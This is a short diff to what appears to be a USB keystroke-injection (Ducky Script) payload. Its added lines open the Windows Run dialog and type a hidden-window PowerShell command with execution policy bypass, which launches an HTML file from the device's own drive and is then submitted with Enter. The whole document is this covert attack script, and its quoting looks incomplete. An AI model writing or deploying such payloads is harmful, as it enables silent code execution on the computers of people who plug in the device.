@@ -1,3 +1,5 @@
-STRING %
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass Start-Process "
+STRING file:///D:/%2500_index.html
 ENTER
-ALT F4
